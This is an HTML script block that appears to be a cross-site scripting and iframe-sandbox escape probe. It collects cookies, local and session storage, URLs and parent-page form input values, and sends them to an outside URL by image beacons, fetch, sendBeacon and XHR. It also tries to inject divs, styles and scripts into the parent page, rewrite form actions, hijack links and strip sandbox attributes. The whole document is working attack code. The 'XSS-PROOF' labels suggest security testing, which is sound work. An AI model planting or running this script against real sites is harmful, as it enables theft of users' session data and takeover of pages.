<script>
(function(){
  var hit = function(tag, extra){
    var url = 'https://google.com/?test=' + encodeURIComponent(tag);
    if(extra !== undefined) url += '&data=' + encodeURIComponent(String(extra).slice(0, 500));
    try{ new Image().src = url; }catch(e){}
    try{ fetch(url, {mode:'no-cors'}); }catch(e){}
    try{ navigator.sendBeacon && navigator.sendBeacon(url); }catch(e){}
  };

  hit('script-executed');

  // --- Read-only environment checks ---
  try{ hit('cookies', document.cookie || 'empty'); }catch(e){ hit('cookies-blocked', e.message); }
  try{ hit('localStorage', JSON.stringify(localStorage)); }catch(e){ hit('localStorage-blocked', e.message); }
  try{ hit('sessionStorage', JSON.stringify(sessionStorage)); }catch(e){ hit('sessionStorage-blocked', e.message); }
  try{ hit('location', location.href); }catch(e){ hit('location-blocked', e.message); }
  try{ hit('origin', location.origin); }catch(e){ hit('origin-blocked', e.message); }
  try{ hit('referrer', document.referrer || 'empty'); }catch(e){}
  try{ hit('user-agent', navigator.userAgent); }catch(e){}
  try{ hit('domain', document.domain); }catch(e){ hit('domain-blocked', e.message); }

  // --- Parent READ access ---
  try{ var len = window.parent.document.body.innerHTML.length; hit('parent-dom-read', 'len='+len); }
  catch(e){ hit('parent-dom-read-blocked', e.message); }
  try{ hit('parent-cookies', window.parent.document.cookie); }catch(e){ hit('parent-cookies-blocked', e.message); }
  try{ hit('parent-location', window.parent.location.href); }catch(e){ hit('parent-location-blocked', e.message); }
  try{ hit('top-readable', top.location.href); }catch(e){ hit('top-read-blocked', e.message); }
  try{ hit('frames-count', window.parent.frames.length); }catch(e){ hit('frames-blocked', e.message); }

  // --- Parent WRITE access (the big one — div/form/style tampering) ---
  try{
    var d = window.parent.document.createElement('div');
    d.id = 'pwned-by-iframe';
    d.textContent = 'XSS-PROOF-INJECTED';
    d.style.cssText = 'position:fixed;top:0;left:0;background:red;color:white;padding:20px;z-index:99999';
    window.parent.document.body.appendChild(d);
    hit('parent-div-injected');
  }catch(e){ hit('parent-div-injection-blocked', e.message); }

  try{
    var divs = window.parent.document.querySelectorAll('div');
    if(divs.length){
      divs[0].setAttribute('data-pwned','1');
      hit('parent-div-modified', 'count='+divs.length);
    } else { hit('parent-no-divs'); }
  }catch(e){ hit('parent-div-mod-blocked', e.message); }

  try{
    var forms = window.parent.document.querySelectorAll('form');
    if(forms.length){
      hit('parent-form-action-readable', forms[0].action);
      var orig = forms[0].action;
      forms[0].action = 'https://google.com/?test=form-action-rewritten';
      hit('parent-form-action-rewritten', 'was: ' + orig);
      forms[0].action = orig; // restore so you can actually use the page after
    } else { hit('parent-no-forms'); }
  }catch(e){ hit('parent-form-rewrite-blocked', e.message); }

  try{
    var inputs = window.parent.document.querySelectorAll('input');
    var vals = [];
    for(var k=0; k<inputs.length && k<10; k++){
      vals.push((inputs[k].name||'?') + '=' + (inputs[k].value||''));
    }
    hit('parent-input-values', vals.join('|') || 'none');
  }catch(e){ hit('parent-input-read-blocked', e.message); }

  try{
    var st = window.parent.document.createElement('style');
    st.textContent = 'body{outline:5px solid red !important}';
    window.parent.document.head.appendChild(st);
    hit('parent-style-injected');
  }catch(e){ hit('parent-style-blocked', e.message); }

  try{
    var ps = window.parent.document.createElement('script');
    ps.src = 'https://google.com/?test=parent-script-loaded';
    window.parent.document.head.appendChild(ps);
    hit('parent-script-injected');
  }catch(e){ hit('parent-script-injection-blocked', e.message); }

  try{
    window.parent.document.querySelector('iframe').removeAttribute('sandbox');
    hit('sandbox-removed-from-parent');
  }catch(e){ hit('sandbox-removal-blocked', e.message); }

  try{
    var links = window.parent.document.querySelectorAll('a');
    if(links.length){
      var origHref = links[0].href;
      links[0].href = 'https://google.com/?test=link-hijacked';
      hit('parent-link-hijacked', 'was: ' + origHref);
      links[0].href = origHref;
    } else { hit('parent-no-links'); }
  }catch(e){ hit('parent-link-hijack-blocked', e.message); }

  try{
    var bodyClone = window.parent.document.body.cloneNode(false);
    hit('parent-body-cloneable', 'tag=' + bodyClone.tagName);
  }catch(e){ hit('parent-body-blocked', e.message); }

  // --- Cross-frame messaging ---
  try{ parent.postMessage('escape-test-payload','*'); hit('postmessage-sent'); }
  catch(e){ hit('postmessage-blocked', e.message); }

  // --- Self-iframe escalation ---
  try{ var w = open('about:blank','_blank'); if(w){ hit('popup-opened'); try{w.close();}catch(e){} } else { hit('popup-null'); } }
  catch(e){ hit('popup-blocked', e.message); }

  try{
    var f = document.createElement('form');
    f.action = 'https://google.com/?test=form-action-target';
    f.method = 'GET'; f.target = '_blank';
    var inp = document.createElement('input');
    inp.name = 'leak'; inp.value = 'test';
    f.appendChild(inp);
    document.body.appendChild(f);
    hit('form-built-in-iframe');
  }catch(e){ hit('form-build-blocked', e.message); }

  try{
    var s = document.createElement('script');
    s.src = 'https://google.com/?test=dynamic-script-load';
    document.body.appendChild(s);
    hit('dynamic-script-appended');
  }catch(e){ hit('dynamic-script-blocked', e.message); }

  try{
    var i = document.createElement('iframe');
    i.src = 'https://google.com/?test=dynamic-iframe-load';
    document.body.appendChild(i);
    hit('dynamic-iframe-appended');
  }catch(e){ hit('dynamic-iframe-blocked', e.message); }

  try{ eval("hit('eval-works')"); }catch(e){ hit('eval-blocked', e.message); }
  try{ Function("hit('function-constructor-works')")(); }catch(e){ hit('function-constructor-blocked', e.message); }
  try{ setTimeout("hit('settimeout-string-works')", 0); }catch(e){ hit('settimeout-string-blocked', e.message); }

  try{ var xhr = new XMLHttpRequest(); xhr.open('GET','https://google.com/?test=xhr-leak',true); xhr.send(); hit('xhr-sent'); }
  catch(e){ hit('xhr-blocked', e.message); }
  try{ new WebSocket('wss://google.com/'); hit('websocket-attempted'); }catch(e){ hit('websocket-blocked', e.message); }

  try{ history.pushState({},'','/pwned'); hit('history-pushstate-ok'); }catch(e){ hit('history-blocked', e.message); }

  hit('script-completed');
})();
</script>
